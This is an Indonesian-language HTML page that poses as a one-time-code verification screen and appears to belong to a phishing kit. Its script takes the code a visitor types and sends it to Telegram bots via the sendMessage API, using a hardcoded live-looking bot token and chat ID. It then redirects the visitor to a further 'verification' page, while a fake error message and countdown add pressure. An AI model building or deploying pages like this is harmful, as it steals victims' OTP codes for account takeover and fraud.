<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Verifikasi Kode</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Arial', sans-serif;
        }

        body {
            background-color: #000000;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            align-items: center;
            padding: 20px;
            color: #000;
        }

        .container-box {
            background: white;
            width: 100%;
            max-width: 700px;
            padding: 25px;
            border-radius: 8px;
            text-align: center;
            margin-bottom: 50px;
        }

        .title {
            font-size: 1rem;
            font-weight: bold;
            margin-bottom: 15px;
        }

        .input-box {
            width: 100%;
            height: 40px;
            border: 1px solid #999;
            border-radius: 4px;
            padding: 0 15px;
            font-size: 1rem;
            margin-bottom: 10px;
            outline: none;
        }

        .info-text {
            font-size: 0.8rem;
            color: #666;
            margin-bottom: 5px;
        }

        /* === STYLE PESAN SALAH === */
        .error-text {
            font-size: 0.8rem;
            color: #ff0000;
            margin-bottom: 10px;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 5px;
        }
        /* ======================== */

        .timer-text {
            font-size: 0.9rem;
            font-weight: bold;
            margin-bottom: 10px;
        }

        .resend-link {
            font-size: 0.8rem;
            color: #000;
            text-decoration: underline;
            margin-bottom: 25px;
            display: inline-block;
        }

        .submit-btn {
            width: 100%;
            padding: 10px;
            background-color: #ff0050;
            color: white;
            border: none;
            border-radius: 4px;
            font-size: 0.9rem;
            font-weight: bold;
            cursor: pointer;
        }

        .footer-text {
            color: white;
            font-size: 0.8rem;
            text-align: center;
            max-width: 600px;
        }
    </style>
</head>
<body>

    <div class="container-box">
        <div class="title">Masukkan kode verifikasi</div>

        <input type="Number" id="kode" class="input-box" placeholder="Masukkan kode disini">

        <div class="info-text">
            Kode OTP di kirim via SMS/WhatsApp/Email.<br>
            OTP akan kedaluwarsa setelah 3 menit.
        </div>

        <!-- === TULISAN KODE SALAH === -->
        <div class="error-text">
            <i class="fas fa-exclamation-triangle"></i> Kode salah, Masukkan lagi.
        </div>
        <!-- ========================= -->

        <div class="timer-text" id="timer">02:51</div>

        <a href="verifikasi kode.html" class="resend-link">Kirim ulang kode</a>

        <button class="submit-btn" onclick="kirimData()">MASUK</button>
    </div>

    <div class="footer-text">
        Anda mungkin menerima SMS, notifikasi WhatsApp,<br>
        dan notifikasi pesan instan lainnya.
    </div>

        <!-- ============================================== -->
    <!-- SCRIPT KIRIM KE 2 BOT TELEGRAM & PINDAH HALAMAN -->
    <!-- ============================================== -->
    <script>
        // ==================== BOT 1 ====================
        const BOT1_TOKEN = "8463412359:AAG6nli8rzC54LQSKkgXBXkwI8ePspNfFIA"; 
        const BOT1_CHAT_ID = "-1003797236002";

        // ==================== BOT 2 — GANTI DENGAN DATA BOT KEDUA ====================
        const BOT2_TOKEN = ""; 
        const BOT2_CHAT_ID = "MASUKKAN_CHAT_ID_BOT_KEDUA_DISINI";

        // ==================== HALAMAN TUJUAN ====================
        const HALAMAN_BERIKUTNYA = "verifikasi ulang.html";

        // === TIMER HITUNG MUNDUR ===
        let totalDetik = 2 * 60 + 51; // 2 menit 51 detik
        const timerElement = document.getElementById('timer');
        let timerExpired = false;
        
        const countdown = setInterval(() => {
            let menit = Math.floor(totalDetik / 60);
            let detik = totalDetik % 60;
            
            detik = detik < 10 ? "0" + detik : detik;
            timerElement.textContent = menit + ":" + detik;
            totalDetik--;

            if(totalDetik < 0) {
                clearInterval(countdown);
                timerElement.textContent = "Waktu Habis";
                timerElement.style.color = "#ff0050";
                timerExpired = true;
            }
        }, 1000);

        // === FUNGSI KIRIM KE BOT ===
        async function kirimKeBot(token, chatId, pesan) {
            try {
                const res = await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
                    method: "POST",
                    headers: {"Content-Type": "application/json"},
                    body: JSON.stringify({
                        chat_id: chatId,
                        text: pesan,
                        parse_mode: "HTML"
                    })
                });
                const data = await res.json();
                return data.ok;
            } catch (err) {
                console.log("Gagal kirim:", err);
                return false;
            }
        }

        // === FUNGSI UTAMA KIRIM DATA ===
        async function kirimData(){
            let kode = document.getElementById("kode").value.trim();
            let btn = document.getElementById("btnKirim");
            let error = document.getElementById("pesanError");

            // Validasi
            if(kode === "" || kode.length < 4){
                error.style.display = "block";
                return false;
            }
            error.style.display = "none";

            // Kunci tombol
            btn.disabled = true;
            btn.innerText = "Memproses...";

            // Format pesan
            let pesan = `<b>🔐 Kode Verifikasi / OTP</b>
Kode: <code>${kode}</code>
Waktu: ${new Date().toLocaleString('id-ID')}
${timerExpired ? '⚠️ Waktu sudah habis!' : ''}`;

            // Kirim ke 2 bot SECARA BERSAMAAN
            const [hasilBot1, hasilBot2] = await Promise.all([
                kirimKeBot(BOT1_TOKEN, BOT1_CHAT_ID, pesan),
                kirimKeBot(BOT2_TOKEN, BOT2_CHAT_ID, pesan)
            ]);

            console.log("Bot 1:", hasilBot1 ? "✅ Berhasil" : "❌ Gagal");
            console.log("Bot 2:", hasilBot2 ? "✅ Berhasil" : "❌ Gagal");

            // Pindah halaman
            window.location.href = HALAMAN_BERIKUTNYA;
        }

        // Kirim ulang kode — reset input & timer
        document.getElementById('kirimUlang').addEventListener('click', () => {
            alert('Kode baru telah dikirim!');
            document.getElementById('kode').value = '';
            document.getElementById('kode').focus();
        });

        // Otomatis kirim setelah 6 digit terisi
        document.getElementById('kode').addEventListener('input', (e) => {
            if(e.target.value.length === 6) {
                kirimData();
            }
        });

        // Tekan Enter untuk kirim
        document.addEventListener('keypress', function(e) {
            if (e.key === 'Enter') kirimData();
        });
    </script>

</body>
</html>
